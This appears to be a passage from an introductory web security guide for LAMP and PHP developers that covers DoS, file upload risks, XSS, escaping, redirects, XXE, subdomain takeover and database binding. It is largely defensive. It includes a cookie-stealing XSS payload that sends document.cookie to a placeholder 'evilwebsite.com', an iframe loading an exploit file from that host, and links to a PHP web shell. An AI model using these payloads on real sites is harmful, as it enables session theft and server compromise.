Some types of DoS/DDoS attacks include SYN flood, UDP reflection, UDP amplification, NTP reflection, NTP amplification, and Slowloris. I think Slowloris is the most interesting form of DoS attack. It’s a “slow DoS” attack because it involves taking up as many user sessions as possible. A web server can only handle so many concurrent users, even if they’re idle. A Slowloris DoS attack involves making your computer pretend to be many different devices, all connecting to the web server, but not really doing much, As such, a Slowloris attack requires much less bandwidth than something dumber like a SYN flood. 

A tool used for DoS attacks is called a booter, because it boots someone or something offline. People who will offer DDoS services will sometimes advertise it as “website stress tests” even though they know what their customers are really looking for. Sometimes, someone will have a botnet, and then they basically rent it out to people. If you want someone to DDoS something, you can just pay someone, and they’ll do it for you, using lots of devices that have malware called bots, in a botnet, which accept commands remotely. 

**Resource exhaustion** – a denial of service caused by using up resources on a server. If there’s a link a user can click on your website that corresponds to some script that does a lot of stuff, and it uses up a lot of CPU cycles when it gets run for a user, then someone who repeatedly clicks it could cause resource exhaustion, assuming you don’t have any sort of rate limiting for its usage. For example, rate limiting for an API could mean making it so that a user can only do one request per second, in order to decrease the resource usage of the server for a given user. There are many other kinds of resource exhaustion though.

**Typosquatting** – over the years, there have been a couple times that I’ve accidentally made a typo when typing in a domain name, such as facebok.com instead of facebook, goggle.com instead of google.com, youtub.com instead of youtube.com, reddit.co instead of reddit.com, and things like that. Typosquatting is when a criminal registers a domain name that is a common typo/misspelling of a real website’s domain name, and then they will get traffic to their site that is intended for another site. From there, they might advertise a scam, deliver a malicious payload, or even have a fake login screen that will steal someone’s login information for the legitimate site.

### Don't use old versions of Apache or PHP

Older versions of PHP are not secure! That's right: even a programming language can have security vulnerabilities, even if the code you write within it is good! There are smaller changes within PHP 7, such as 7.1, 7.2, 7.3, and so on. But these are smaller differences, compared to the difference between PHP 5.6 and PHP 7. There is no PHP 6. They tried making PHP 6, had some problems, and then cancelled it. PHP 6 had a lot of interesting ideas that were difficult to code, so they made the next version less ambitious, and that’s what PHP 7 is. But although PHP 7 isn’t as ambitious as PHP 6 was going to be, it’s still got a lot of cool new features, and it’s better than PHP 5.

Starting a fresh project is a no-brainer: use PHP 7. But for people who are updating older applications, it's not so easy. You see, while PHP 7 is great in many ways, like the newer features, and also the continued security updates (unlike older versions of PHP, which are EOL), it also broke compatibility in some ways. I first noticed this when I once tried to set up a LAMP-based ticketing system program on a LAMP server. My server was running PHP 7. The ticketing system program was intended for PHP 5.6. I encountered error messages and it didn't work. As it turns out, the only way to fix the error messages was to use an older (and possibly insecure) version of PHP. That's not good. 

However, PHP applications have been slowly but surely migrating to PHP 7. Some older PHP programs really do need to change their code in order to work with PHP 7, but it's been a while since PHP 7 was first released, and as time goes on, more and more people are fixing the compatibility issues. The divide reminds me of Python 2.7 vs. Python 3. Adoption of Python 3 was a little slow at first, but people eventually switched. But not every programming language change gets accepted. For example, Perl5 was very popular, but very few people like Perl6. 

The only way to survive in software development is to accept new changes. Not all changes are good, but many changes are necessary, and many exist whether you like them or not.

In the future, there will be PHP 8 or PHP 9. There will be a new version of Python. There will be new programming languages out. There will be new operating systems, programming languages, cloud providers, IoT devices, form factors, CPU architecture, trends, fads, programming paradigms, web server platforms, tech stacks, types of security issues, social media platforms, and all sorts of other new things. You need to accept it, rather than being like the people who would rather stick with old tech simply because it's what they're used to. 

So when I say "people should upgrade to PHP 7" what I really mean is "people should keep up with industry changes."

## File uploads

This chapter is long enough as it is, so I won't go into the specifics of how to support file uploads. Just know that you can accept file uploads from users. However, don't do this until you do some research into file upload security issues. File uploads can be a huge security problem. Text submissions from users are hard enough to deal with, and file uploads are even worse.

Here are some security issues relating to file uploads:

**File upload vulnerabilities** – if you let someone upload any old file to your server, it could be used to hack you. Firstly, limit file types. If you have an image-hosting site, why would you accept PHP files? That wouldn’t make sense. But that being said, even if you think you're limiting file types to certain extensions, there are still sneakier ways people can upload things that aren't allowed. 

A common thing to do for servers with file upload vulnerabilities is to upload a web shell, such as WSO shell. A shell on a computer, like bash, lets you send commands to the computer so that you can control it. A web shell is the same way, only in a web browser. LAMP servers need to be careful about PHP web shells, of which there are plenty. 

I even wrote my own minimalist web shell, which you can find here:

<https://github.com/0x416c616e/php_web_shell>

**MIME spoofing** – making one file look like it's another type of file. An example of this is a jpg web shell. It looks like an image file to a naively-coded file upload handler, but in reality it's actually a PHP script. MIME stands for Multipurpose Internet Mail Extensions, and basically means file types for the internet.

**File size** – when you accept file uploads, it's going to take up space on your server's storage. If you don't limit file sizes and file upload limits, then people could quickly fill up your storage. This can be an issue for disk space and also bandwidth and performance. For example, a user shouldn't be able to upload a 50MB image for their profile picture, as it would be impractically slow to load and also takes up too much space.

**File steganography** – you can hide data within other files. I even wrote a graphical file steganography tool in Java which lets you hide files within image files. It’s called File Hider. I’m so creative with how I name things, I know. A good way to get around image steganography is to use ImageMagick to compress images, which will not only reduce filesize, but should also get rid of steganographic data. 

If you use a hex editor to parse through binary data, you can see that there's a part of an image file called the "EOI" or End Of Image marker, which comes before the EOF. And you can put arbitrary data in between the EOI and EOF and it won't corrupt the file at all. This is the principle my file steganography tool is based on. However, this type of steganography is what I'd call "concatenation steganography" but I've seen some projects on GitHub that I'd refer to as "transformative steganography," meaning they change the image's binary data, which makes the image look glitchy or corrupt, but it's harder to distinguish between the hidden data and the image itself. 

If you want to check out my file steganography tool, you can see and download it here:

<https://github.com/0x416c616e/filehider>

**File metadata** – if someone uploads photos, they might have personally-identifiable metadata, called Exif, in them. If you accept image uploads, use a tool to delete Exif data to protect your users. Exif data can contain rinformation about the person who uploaded it, like their GPS location, model of camera or phone, and things like that. Exif data can be used to harass or doxx someone, so never store metadata. 

**PHP injection** – aside from privacy concerns, another issue with image metadata is that hackers can put PHP code in metadata fields. Here’s a succinct example: https://github.com/xapax/security/blob/master/bypass_image_upload.md

**Bad content** – people might post bad things to your website. So you need to make sure you log IP addresses and associate them with uploaded files. For example, you could log to a file, or make a table in a database where a new row is created for every file upload, where you have an account (if the file upload feature requires being logged in), the file itself, the IP address of the user who uploaded the file, and a timestamp of when it was uploaded. You should also make a feature that will delete the file and possibly delete the database entry for it as well. Some kinds of bad content include shock value content, copyrighted content, or malware. 

For every text comment or file upload, you need to save the IP address and timestamp. This is because IP addresses can be leased dynamically, so one day, one person will have a certain IP address, and the next day someone else with the same ISP might have it. But when you have both an IP address and a timestamp, it can be linked to a particular customer of an ISP (unless it’s someone using free public wifi or their neighbor’s unsecured wifi). Of course, some people might use VPNs, but many VPNs keep logs of this stuff too. You need to log IPs and timestamps in case someone posts something bad, like a bomb threat or a copyrighted movie, so that you can cooperate with law enforcement. If you don't log this stuff, then you might be held liable for what users upload. So always protect yourself by logging information about who uploaded what. 

Because VPNs and Tor can hide people's real IP addresses, that can make it harder to track someone down. So that's why some people choose to ban VPNs and Tor so that they don't have to deal with people posting bad stuff. 

A while back, I heard about how someone who has an email server had to talk with law enforcement because someone used their email server to send violent threats. And it's common for people who have file hosting sites to get in trouble because of their users uploading copyrighted stuff, like movies. 

In a perfect world, nobody would post anything bad on websites. But this is not a perfect world.

Also, even though you can often use IP addresses to identify people (again, only with a timestamp), there are some cases where that's not possible. For example, if someone uses a VPN, Tor, hacked server, or public wifi, such as stealing a neighbor's wifi or going to a cafe. Also, because of network address translation, there could be many people at a single location, but with only one public IP address, so an IP in that case could only tell you the ISP customer, not the individual at the location.

**Malware hosting** – even if your server can't run an executable that a user uploads, your server can still be used for spreading malware. For example, if a user uploads a ransomware .exe file, your server won't get infected with ransomware, but the malicious user can send the link to other people, so your server will be inadvertantly helping the cybercriminal with spreading their malware to make money. 

**Files with the same filename** – make sure you don't have someone upload file.jpg and have it write over another existing file called file.jpg.

**Bad filenames and upload tampering** – you need to sanitize and validate filenames of file uploads to make sure they're not something that will mess things up. 

**Only using client-side validation** – if you use client-side JavaScript to try and validate uploads (or any submissions at all, even just text), you're doing it wrong. All validation of form submissions and file uploads must be done server-side. Client-side JS can't be trusted because the user can just disable or modify it to get around whatever protections you've put in place.

I don't recommend allowing for file uploads until you've mastered the basics of securing a LAMP server and protecting user-posted text, such as forms and comments. File upload security is more complicated than text security.

The way I see it, having a website that accepts user-uploaded content is like owning a hotel. If someone is using drugs in one of your hotel rooms, you can't just turn a blind eye to it. If you notice it, or someone else complains about it, you report it. But at the same time, you're not the one doing it.

If people post bad things, you need to be able to ban them. However, there is one problem here: people can easily evade bans by using VPNs or Tor. If you want to prevent ban evasion, you will need to block VPNs and Tor. Some websites do this. People who use these tools legitimately for privacy or security concerns say it's mean to block them just because a few bad users use them. But at the same time, if your options are dealing with internet trolls who evade IP bans using VPNs/proxies/Tor, then a solution can be to just ban all the IPs that these IP-changing services use. If you want to block VPNs and Tor, check out this list on GitHub: https://github.com/ejrv/VPNs

Should you really block these IPs? It's a complicated subject. I personally use a VPN for privacy, but I also know that some people use these services for undesirable things, like spam, hacking, trolling, copyright infringement, and fraudulent charges. So for people who don't want to deal with that, it's easier to just block them outright.

Aside from Tor and VPNs, which can be used for both good and bad things, there is a list of IPs that are up to no good (and thus should be blocked): https://www.abuseipdb.com/

A different kind of blocking is called geoblocking. Some websites block entire countries. There's something called IP geolocation. Because you can see which internet service providers have which IP addresses, and see which country each ISP is in, it's possible to make lists of which countries each IP address corresponds to. 

Sometimes, geoblocking is due to legal reasons, such as if a media streaming service only has a copyright agreement to be able to stream copyrighted media in certain countries, meaning they have to block ones that they're not approved to stream in by the copyright holder. Another example of geoblocking is blocking all EU countries so that you don't have to deal with GDPR privacy law. GDPR states that companies that fail to meet GDPR compliance can get huge fines, but considering that GDPR is EU legislation, it doesn't affect non-EU countries. So maybe your company doesn't want to deal with GDPR and all the headaches it involves, so you just decide to block all EU countries. I’m not recommending that, I’m just saying it’s something that some people might do.

If you accept file uploads, it’s best to only do so after you’ve learned in-depth about the binary data format of a file type that you’re accepting as an upload to your site. A good way to do this is by reading RFCs, wiki pages, and even using hex editors to view all the different fields in a binary file. Keep in mind that binary file just means anything that isn’t text-based. A Python .py file is a text file because you can read it as text. A jpg image is a binary file because you can’t make sense of it in a text editor. All files can be classified as either text or binary formats.

For hex editing on a Mac, check this program out:

<https://www.synalysis.net/>

For hex editing on Windows, check this out:

<https://hexinator.com/>

Linux:

<https://hexinator.com/hexinator-linux/>

From there, you will be able to better understand all the different pieces of a file, such as a JPG, GIF, or PNG image that a user can upload to your site.

**Not using a CDN** – Cloudflare isn’t just for making static assets load faster. They also offer DDoS protection and can block certain bad users. Using a CDN can be useful for security as well as performance.

**Link shorteners and redirects** – link shorteners are sites like tinyurl.com or bit.ly that allow you to “shorten” a link. This can be used for attackers who are making use of something like a reflected XSS vulnerability, because if you saw a super long URL, you might be a little suspicious. But when you see a link shortener, that’s just normal, right? But they really shouldn’t be trusted, as they can redirect you to bad pages, like for CSRF or XSS. 

Additionally, links can easily be redirected. So if someone sends you a link to example.com/photo.jpg, the server might redirect you to example.com/attackpage.html, and it has malicious JavaScript on it. 

Not scanning for malware/indicators of compromise – many people are critical of anti-malware software. Sure, it’s not perfect. But it’s better than nothing. Just like how you can scan a desktop or laptop for malware, you can do the same for servers, though the kinds of software you’ll run on it will be different. Some examples of security scanning software for Linux are chkrootkit, rkhunter, lynis, and clamav. There is a misconception that security is only an issue for Windows. This is not true at all. Any operating system can get malware or be hacked. Linux malware might be different from Windows malware, but it’s malware nonetheless. A Linux web server will actually be subject to more attack attempts than some Windows computer on a home network. In fact, the Windows computer will probably be behind a home router that has a firewall, and the router is probably running Linux too. There are even router botnets. 

Some people get very defensive about their choice of OS and will imply that the one they prefer is perfect. But the fact of the matter is that security is an issue for every single operating system out there. If someone says something has perfect security, they’re either lying or don’t know what they’re talking about.

**whois/OSINT doxxing** – when you register a domain name, depending on the registrar you use, it might put your personal information that you used to register the site into something called whois. You can view information about someone who registered a domain with whois. Here’s a whois-viewing site: https://who.is/

These days, if you register a domain with a registrar such as Namecheap, they will include their WhoisGuard service for free, which will replace your personal information with Namecheap contact info. But if you don’t use a whois-protecting service, your name, phone number, address, and email address will be publicly available to anyone who wants to look up the whois for the domain. That’s really bad. I personally think that whois data was a poorly thought out idea and should be done away with entirely. A registrar should really only keep registrant information privately, never publicly. If you register a domain name for a website or app that you want to make, and you don’t take whois precautions, then people could find out where you live and possibly use that information to harass you on social media, a practice known as doxxing (getting your personal documents).

whois is just a small portion of a greater topic known as OSINT, or Open Source Intelligence. OSINT is the practice of finding out information using free and public resources. By contrast, a private investigator or background check is not OSINT because they cost money. In hacking, OSINT is used to gather preliminary information about a website or person or business before proceeding with more technical hacking stuff. OSINT is part of something called reconnaissance. Hackers can use the personal information you post about yourself against you.

**Lack of testing before pushing to production** – pen test your own code before pushing it to production. Look up tutorials for SQL injection, CSRF, and XSS attacks. There are a billion security topics out there, but at least test for those 3 things. If you can successfully do any of those attacks on your own server and web app code, then you need to fix it before you put that code on the internet on your actual web server. If you never do any sort of pen testing in a dev/testing environment, odds are there’s some sort of security vulnerability you just haven’t tested for yet. 

Test your web development code before you put it on the internet!

For other OWASP categories of common security issues, check out this article:

<https://www.cloudflare.com/learning/security/threats/owasp-top-10/>

Ideally, you’d want to test your code for all 10 of the OWASP top 10 categories. Even then, only securing a server against 10 things isn’t much. But it’s a good starting place. 

Think of testing for security vulnerabilities like programming languages: do you learn multiple programming languages at the same time? No, that would be ridiculous – unless you’re in college, where you’ll do that, but it’s still ridiculous. But the point is that it’s best to learn one programming language after the other. Focus on one thing and then another. Trying to learn many things separately will be hard. Similarly, learn one security issue and how to test your code for it, and learn it well, and then move on to learning another one.

**Snuffleupagus PHP7+ security module** – a way to make PHP more secure.

**Suhosin** – like Snuffleupagus, but for earlier versions of PHP. It might make a comeback – but for now, Snuffleupagus is accepted as a good practice for PHP7.

**security.txt** – a proposed standard for contact info for if you find a security issue with a website, kind of like robots.txt but for bug bounties/responsible disclosure

<https://www.google.com/.well-known/security.txt>

**Clickjacking** – an attacker can make a web page in such a way that, when a user means to click on one thing, they’re actually clicking on some transparent thing instead, which will get them to click on something malicious.

**HTTP response splitting** – putting malicious code into a web application request so that it will be used by the server in an HTTP response header. 

**HTTP Parameter Pollution** – using multiple parameters with the same name but different values.

For example:

```
example.com/search.php?term=hello&term=world
```

In the above example, the parameter term is listed twice. Depending on the server-side software that’s running, it might be possible to attack a server by using duplicate parameters with different values. Some servers will use the first value, some will use the second. Some will use them all. 

If a website filters out SQL injection from individual parameters, it’s possible to do SQL injection by breaking it up into multiple duplicate parameters, each with a different piece of the SQL injection code. 

**XXE attacks** – XML eXternal Entity attacks. XML lets you structure data. An XML entity is a way to define something so that you can refer back to it later. An external entity in XML is an entity in a remote location. If an XML parser can accept external entities, it can get remote content, which could be malicious. The solution is for XML parses to not accept any external entities.

There are other XML attacks, such as XML unrestrictive schema, XML DTD retrieval. XSL transformation, schema poisoning, and XPath injection, but there’s enough XML stuff in this chapter as it is. Just know that XML security is difficult.

**Dangerous redirects/forwarding** – a redirect is when a webpage takes a user from one page to another. If you go to example.com/sdfsfsdfsdfsdf, you might be redirected to a 404 page. If you go to a page that has been moved, it might use a 301 redirect to take you to the new one. Redirects are unsafe when they are not validated. Poorly-written back-end code on a web server might allow an attack to make a legitimate site redirect to a malicious site. 

Here is an example of a dangerous redirect:

```
example.com/view.php?url=evilwebsite.com
```

In this case, the redirect is not permanent. If someone just goes to example.com, they won’t be redirected. Someone would have to click on a link to the dangerous redirect, kind of like reflected XSS. But someone might trust example.com, and they don’t trust evilwebsite.com. But if they just quickly glance at the link and see example.com at the beginning, they might trust it and be more likely to click on it. If the link started with evilwebsite.com, the user might be more wary of it. 

**Sanitizing, validating, and escaping input** – when dealing with user input, you need to sanitize, validate, and either filter or escape.

**Sanitizing** – makes sure that user input will not cause any security issues.

**Validation** – compare user input to regex to make sure it’s acceptable. Validation can be more than just security stuff. For example, let’s say there’s a form on a website where you can list your name, phone number, and a message, so that the business can read it and get back to you.

Maybe the person filling out the form is rushing it, and they accidentally put their name in the phone number field, and vice versa. This won’t hack your site, but it isn’t acceptable input. A name is not a valid phone number, because phone numbers need to be numbers. And putting a phone number in a name field won’t work either, as phone numbers aren’t letters. 

Will switching up two fields cause code execution, SQL injection, or XSS? No. But it still can’t be accepted.

Sanitizing, validation, and escaping need to happen server-side, not client-side. If you write JavaScript client-side to validate fields before the user can submit them, they can just edit or disable the client-side JavaScript. So client-side sanitization/validation/escaping basically does nothing.

Some people say that you should do client-side validation in addition to server-side validation, and that client-side validation can make the user experience better, because it won’t let them submit a form until they fix it, as opposed to submitting a form and getting a message saying their input was incorrect.

But if you do client-side validation in addition to server-side validation, then disable your client-side validation when you’re testing it, otherwise you might accidentally be only properly validating client-side, which is not acceptable. 

**Escaping** – turning unsafe characters into escape sequences. Escaping is important when data is shown back to a user. Sanitizing and validating are good for when you get data from a user and do something like put it into a database, but escaping makes it safe to get it out of a database to send it back to users. If you did proper sanitizing and validating but no escaping, your server would be safe from stuff like code execution, but it could still be vulnerable to XSS.

Here are some examples of escape sequences:

```
Character				Escape sequence
Double quotes:	"		&quot;
Greater than:	>		&gt;
Less than:	<		&lt;
Apostrophe:	'		&apos;
Ampersand:	&		&amp;
Nonbreak space: 		&nbsp;
```

Keep in mind that non-breaking space is not the same as regular space.

To understand escaping, imagine that a user posts this comment on your website:

<script>alert('XSS');</script>

If you didn’t escape it, then someone who browses the site would see this:
 
![xss](https://github.com/0x416c616e/intro_to_security/blob/master/02_web_security/xss.png)
 
But if you escaped it, it would look like this in the browser:

<script>alert('XSS');</script>

You would see the text, but it would not run as JavaScript.

And if you looked at the page source, you’d see this:

```
&lt;script&gt;alert('XSS');&lt;/script&gt;
```

Escaping is important for protecting against XSS. There’s more to XSS than just escaping though.

But although JavaScript is bad, in the past, back when more people used Flash in their browsers, an attacker could do something like this instead:

```
<iframe src="evilwebsite.com/exploit.swf"></iframe>
```

Flash-based exploit kits were usually more capable than JavaScript, and they were commonly used to deliver ransomware. And in the generation before it, Java drive-bys were used to deliver RATs and keyloggers. But even though unescaped JavaScript from XSS isn’t as bad as previous generations of browser-based malware, JavaScript can still be bad. There are even some more obscure JS-based exploits that can lead to code execution. So always escape user input.

That all being said, escaping by itself isn’t enough. Taking data out of a database is deserialization, and there are exploits for insecure deserialization.

**Filtering** – just getting rid of problematic characters. For example, the kinds of characters that can be used for HTML/JavaScript. 

**PHP PDO** – when taking user input and putting it into a SQL query using PHP, you’ll want to use PDO: PHP Data Objects. PDO is useful for prepared statements, which are a secure way to build SQL queries. To make a prepared statement, you need to make a SQL statement template with placeholders (called parameters) for what the user will input, the database prepares and stores the template without running it, and then later the values get bound to the parameters and the statement can be run.

Even with PDO-based prepared statements, you should still sanitize and validate user input. And when retrieving data from the database, always escape it.

**WAF** – a web application firewall is a program that will attempt to filter and stop bad input from going to your web app. It will try to stop attacks such as SQL injection, XSS, LFI/RFI, and things like that. However, don’t think that just because you’re using a WAF that you can get lazy about security. It’s an additional tool to add to your site’s security, but it’s not everything. A WAF, such as ModSecurity, is not the same as a network firewall, such as pf or iptables. You will still need a network firewall in addition to a web application firewall.

**Domain shadowing** – if you are a local business owner and have localbusiness.com, then your customers will go to www.localbusiness.com. They will go to the www subdomain. If there’s something wrong with the subdomain they’re on, they’ll notice it. If someone simply wants to use a domain name, they can phish your domain registrar account, and then create subdomains, like evilsubdomain.localbusiness.com or zxhfpnbste.localbusiness.com or pynhfxvggz.localbusiness.com. In fact, they might create tons of subdomains using your domain name. Instead of the legitimate local business web server, the subdomains will point to malicious servers. From there, victims will be linked to malicious web pages, such as zxhfpnbste.localbusiness.com/webpage.html, and on that web page is malicious code that will do code execution and give the victim ransomware. The reason why this is done is so that the attacker doesn’t need to register their own domain names, and also so that their links will be trusted. localbusiness.com will be a trusted website not on any malware blacklists, so a link to it will go through some security or spam filters. Eventually, the owner of localbusiness.com might be notified of the problem, but by then the subdomain shadowing will have been used many times in order to direct victims to malware. And at that point, it’s not hard for an attacker to do the same thing all over again with another domain registrant’s account on a registrar. 

In domain shadowing, the main website is never messed with. If you go to www.localbusiness.com, it won’t be any different. But that’s because a subdomain can actually point to a different server.

**Fast flux DNS** – a method of hiding malware and phishing sites by rapidly changing what a domain name points to. A botnet owner will have lots of compromised computers and servers, and so they have lots of computers with IP addresses that they can use for a single malicious domain. So for a while, evilwebsite.com will point to 1.2.3.4 (a hacked computer that an attacker turned into a web server that delivers malware), and then a short while later, evilwebsite.com will point to 5.5.5.5 (another hacked computer), and then 7.7.7.7, and then 11.22.3.53, and so on. So evilwebsite.com will point to lots of different machines, each being quickly changed. 

**Under-protected APIs** – if you have an API, you need to secure it. Users can interact with a server using an API. APIs face many of the same kinds of issues that other things face, like injection attacks, misconfigurations, sensitive data exposure, lack of logging/monitoring, broken authentication, and more.

**Focusing all your effort on a small portion of your attack surface** – I remember hearing a while ago about a site being hacked because someone performed SQL injection on a feature on the site that wasn’t used very much. The main features of the site, like users being able to log in or post comments, were thoroughly vetted and secured. But one feature of the site that accepted input, a report form, was neglected. You need to test every single thing on your site. 

**Billion laughs** – an XML-related denial of service attack. XML is a way to structure data. It’s similar to JSON in that sense. XML supports defining entities. You can make an entity and then refer to it later. By making a long entity, and then making entities which consist of many of the previous entity, and doing this process many times over, you can make a very short XML file that has a massive amount of stuff, getting exponentially bigger with each subsequent entity made up of entities.

It's called “billion laughs” because a well-known example of it uses lol as the entities. The first entity is just lol, and then the next entity, lol1, consists of many lol entities. Then lol2 entities consist of many lol1 entities. lol3 entities consist of many lol2 entities. Then there’s lol4, lol5, and so on. By the end of the file, it’s about a billion lols in a very short amount of XML data.

The billion laughs attack is sort of similar to a zip bomb, a short .zip file that unzips to be massive. Another related attack is a YAML bomb, which is like the billion laughs attack, but for YAML instead of XML.

A way to protect against this would be to use an XML parser that limits or disallows entity nesting, also called entity expansion. 

**Cloud IP reuse** – in AWS, you can get an IP address for your AWS asset. But if you stop using that IP, someone else can use it, and if you have old code that still points to the IP that you no longer have, then someone else can do stuff like get private data that was intended to be sent to a different server, or do other malicious stuff too. As such, it’s good to keep track of IPs, and what code uses them, and managing change if you change an IP so that there won’t be an issue where your code is using some IP that is no longer yours.

**Domain fronting** – a way to hide the domain you’re actually going to. If someone wants to go to blockedwebsite.com, they can use domain fronting to go to differentwebsite.com and it will take then to blockedwebsite.com even though the network they’re on blocks connections to blockedwebsite.com.

**Incorrect security groups for AWS Virtual Private Cloud** – assets in AWS use security groups. If you set up the wrong one, that could be bad for security. Don’t just click through stuff quickly. It’s good to review settings.

**Subdomain takeovers** – if a company is called Cool Company LLC, their website might be coolcompanyllc.com. Maybe Cool Company LLC buys a company called Cool Bakery Inc. So now, they create a subdomain called coolbakery.coolcompanyllc.com. But instead of pointing to an IP address, coolbakery.coolcompanyllc.com points to the domain name coolbakery.com. The company that got bought had their own website, and then the parent company has a subdomain that points to that site. 

But later down the road, it turns out that Cool Bakery Inc isn’t doing so well, so they eventually go out of business, but Cool Company LLC still exists. coolbakery.com no longer exists. But Cool Company LLC forgot to update their DNS for the subdomain. It might seem harmless at first, because at first, coolbakery.coolcompanyllc.com simply won’t load. It doesn’t go anywhere… until an attacker re-registers coolbakery.com, and now when you go to coolbakery.coolcompanyllc.com, you get directed to a malicious site.

You might be thinking… so what? An attacker could also just make any old domain name, like evilsite.com or adfsfgdfgdfgdfg.com, instead of all that trouble for a subdomain takeover. But keep in mind that there might be many links on the web that point to coolbakery.coolcompanyllc.com. Maybe their Facebook page is still up. Maybe lots of people have linked to it on other social media platforms too. Maybe there’s a viral baking video on Youtube that still links to coolbakery.coolcompanyllc.com in the video description. 

If an attacker registers somerandomsite.com, nobody is going to trust it. And, more importantly, nobody knows that it exists. But even though Cool Bakery went offline, people still know about it. People know and trust Cool Company LLC and Cool Bakery Inc, so the attacker is piggybacking off of their notoriety and trustworthiness.

Instead of a company, it might just be a cloud resource. Like maybe your site is subdomain.example.com and you have a server in the cloud at server1235.cloudcompany.com. Then you stop using that cloud server, but your subdomain still points to that domain anyway, and then someone else spins up a server on that cloud provider.

When a cloud provider offers virtual machine instances on their platform, such as server1235.cloudcompany.com or server12374.cloudcompany.com, they are called instances. When someone used to have server1235.cloudcompany.com, but then stopped using it, it’s referred to as an unclaimed instance. Some other customer could then claim it if they felt like it.

**OS command injection** – a security vulnerability wherein a user can execute commands on the server’s operating system. SQL injection is injecting SQL into a query (or possibly doing a multi-query injection), but command injection is for OS commands, such as shell commands. OS command injection is possible in situations where a web app uses user input and passes it to a shell program, such as CGI. 

Shells are a big deal in hacking, so you should get really comfortable using Bash, as it’s a very commonly used shell.

**Trust relationships** – if Server B blindly trusts stuff from Server A, then if Server A gets hacked, Server B can get hacked too. One example of this would be data from an API. If you don’t do something like schema validation with an API response, then a hacked API could give a malicious response that would do something bad (such as code execution) with your program that uses the API data.

**Insecure deserialization** – here’s a refresher on serialization and deserialization: serialization is taking an object and turning it into a byte stream. Deserialization is taking a byte stream and turning it into an object. In the case of web development, user input could be in an object, saved by being serialized, and then loaded by being deserialized. If unvalidated user input gets deserialized, this can enable an attacker to do malicious things. You can think of insecure deserialization as unvalidated/unescaped/unsanitized deserialization. MITRE officially refers to this category of security vulnerabilities as “deserialization of untrusted data.” Some uses of insecure deserialization include remote code execution, session hijacking, and denial of service.

Attackers can use edited cookies, JSON objects with immediately-invoked function expressions, and more in order to attack a server that uses code that deserializes untrusted data. Insecure deserialization comes down to a fundamental problem in software: user input cannot be trusted. 

**Naïve serialization/deserialization** – a simple but insecure way of achieving serialization/deserialization which should only be done on trusted data, not user input.

**Cookie stealing** – if a website has an XSS vulnerability, an attacker can use JavaScript to steal another user’s cookie, like a login cookie. The JavaScript will get a cookie and send it elsewhere. For example, using an img tag, like so:

```
<script>document.writeln('<img src="evilwebsite.com/cookie.png?cookie=" + document.cookie + "</img>");</script>
```

What’s happening in the above code is that the <script> tag can be used because of an XSS vulnerability, and then document.writeln() will run whenever someone browses the page, and the results will be different for each user. In this case, document.writeln() will add an <img> tag to the page in order to show an image. But an attacker could even use a transparent 1x1 pixel PNG so that you don’t even see the image. ?cookie means you are sending a query string to evilwebsite.com, rather than just getting an image. document.cookie is the cookie. 

All an attacker would have to do is look through their server logs and see requests for evilwebsite.com/cookie.png and look at the query string in order to steal the login cookies, which they can then use to log in to other people’s accounts.

**Traffic sniffing** – looking at network traffic that is intended for someone else. A sniffer captures packets. A packet capture is when someone looks at someone else’s network traffic and saves it on their computer so that they can review it later. Packet captures, or pcaps, can be useful for both good and bad things.

**Overly permissive regular expressions** – when using regular expressions to see if a string is acceptable based on your criteria, it’s possible to make it so that your regex will accept not only things that it should accept, but also things that should not be accepted. This can be bad for security. A good way to prevent this is to use a program that generates regular expressions for you, so that you don’t have to do manual and error-prone regex stuff, or you can make sure to have unit tests for both things that it should and should not accept.

**Cleartext credentials** – sending login credentials using cleartext is like putting your username and password on a postcard and then mailing it. Anyone who can do MITM attacks will be able to see it. By contrast, encryption is like putting a letter with your name and password in an envelope. Plaintext is text that is human-readable and doesn’t need to be encrypted. Cleartext is text that is human-readable when it really ought to be encrypted.

**Cookie editing** – users can edit or delete cookies in their browser. If your web app sets cookies, it’s possible that they could be tampered with by the user. Never trust anything from a user. 

An attacker can inject malicious code into a cookie, which can result in things like SQL injection, if the back-end code doesn’t properly handle the user’s cookies. Cookies should be treated like user input.

Cookies can be encrypted, but even so, the back-end needs to sanitize and validate them.

**Expired domain names** – if you don’t pay to renew your domain name, it will expire, and someone else can register it. When you go to a store and you buy some physical item, you own it forever. If you buy a book at a bookstore, you own it. But when you pay for a domain name, you don’t really own it per se. You are paying for the ability to register it and have it assigned to you for the amount of time that you pay for it, usually about $10 per year. So when you don’t re-register it, someone else can legally register it for themselves. 

Some people will register expired domain names and then attempt to sell them for anywhere from a few hundred to a few thousand dollars. This is called domain squatting, and its legality is dubious. But the fact of the matter is that it really does happen. So try not to let your domain names expire, if you’re still using them. 

The USA has something called the Anticybersquatting Consumer Protection Act, but domain squatting still exists. Cybersquatting applies not only to expired domains, but also to copyrighted names. If your company name is Copyrighted Unique Name, then someone who registers copyrighteduniquename.com is considered a cybersquatter.

If your software points to a domain name that you let expire, and someone else re-registered it, they could use it to get traffic that might have personal info and was intended for your servers, but now points to someone else’s. Same thing if you have a website with links to another website, and then it’s defunct and then a criminal re-registers it and sets up a malicious website.

**Multi-tenant container hosting** – a cloud host where a server has multiple customers on it at the same time is called multi-tenant. This is good for economic reasons, but worse for security. Isolating one customer’s stuff from another customer is harder in multi-tenancy, but still possible. People who really require hardcore security would be better off opting for a single-tenant option instead. Single-tenant is like having your own house, and multi-tenant is like living in an apartment building with roommates and neighbors.

**Misconfigured host binding** – when you set up a database, you can configure a setting called host binding, which means who is allowed to connect to the database to attempt login attempts to it. If someone incorrectly configures the host binding on their database, anyone might be able to attempt to log into it, though they would need the login info, such as the root password for a MySQL installation on a LAMP server. However, in some really bad cases, incorrect host binding can even let people connect remotely to the database without any login at all!

In MySQL, it’s called bind-address. If it’s 0.0.0.0, it will accept connections from all addresses, which is bad. If it’s 127.0.0.1, it will only accept local connections, which is good. In a LAMP stack, you have your Apache server, PHP scripts, and MySQL database all on the same machine. If you were to scale out and have Apache and PHP on one machine, and a separate dedicated database server, then you’d need to configure the bind-address parameter to only accept requests from the dedicated IP address of the Apache/PHP server, and it should have a static IP.

In MongoDB, it’s called IP binding. If you google “mongodb breach,” you will find plenty of instances of large-scale data breaches where someone set up a MongoDB database incorrectly and it led to lots of people having their private data stolen by hackers. Then again, calling someone a “hacker” because they connected to an insecure database that allowed remote connections is pushing it.

